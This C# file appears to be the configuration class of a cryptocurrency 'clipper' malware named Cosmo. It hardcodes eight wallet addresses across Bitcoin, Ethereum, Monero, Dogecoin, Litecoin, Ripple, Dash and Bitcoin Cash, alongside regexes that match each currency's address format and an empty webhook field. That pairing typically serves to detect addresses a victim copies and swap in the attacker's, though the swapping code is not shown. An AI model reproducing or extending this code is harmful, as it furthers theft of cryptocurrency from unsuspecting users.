using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Cosmo.Global
{
    class Global
    {
        public static String guid = Guid.NewGuid().ToString();
        public static String name = "Cosmo";
        public static String webhook = "";

        public readonly static string btc = "bc1qrq5agyz9wyndxkk06zmft3e4s8ujydkarz777r";
        public readonly static string ethereum = "0xca8c37eC2211a7B3dCc41977E57B8c440283a040";
        public readonly static string xmr = "4ASpnJvQzNW1an5s1bjBFvNQmuQjbUJXS7gAYgWPrPdxJvpj397ZNv1gHqafVJ8kYuLocYPN6MAYfAYht32vUACnHfzJ17B";
        public readonly static string doge = "D8vpvbfpZp4egrWZ3v26hfXcA72feDVA6Z";
        public readonly static string lte = "LRStToPLFW3hdVkLAfLqqrwy5GtRSq3Ncb";
        public readonly static string ripple = "rf91abR5uR3G27FRVVxFDwvnM5UAFtG93p";
        public readonly static string dash = "Xf6nzzdsSZRCXhjPqEhg7RN2VmWmrXBSc6";
        public readonly static string bch = "qrn8guw4ss5sl2m4exq7qh7cmx4temr4w5ftysh5vf";

        public readonly static Regex btcRegex = new Regex(@"\b(bc(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|[13][a-km-zA-HJ-NP-Z1-9]{25,35})\b");
        public readonly static Regex ethereumRegex = new Regex(@"\b0x[a-fA-F0-9]{40}\b");
        public readonly static Regex xmrRegex = new Regex(@"\b^4([0-9]|[A-B])(.){93}\b");
        public readonly static Regex dogeRegex = new Regex(@"\b^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$\b");
        public readonly static Regex lteRegex = new Regex(@"\b^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$\b");
        public readonly static Regex rippleRegex = new Regex(@"\br[0-9a-zA-Z]{24,34}\b");
        public readonly static Regex dashRegex = new Regex(@"\b^X[1-9A-HJ-NP-Za-km-z]{33}\b");
        public readonly static Regex bchRegex = new Regex(@"\b(q|p)[a-z0-9]{41}\b");

    }
}
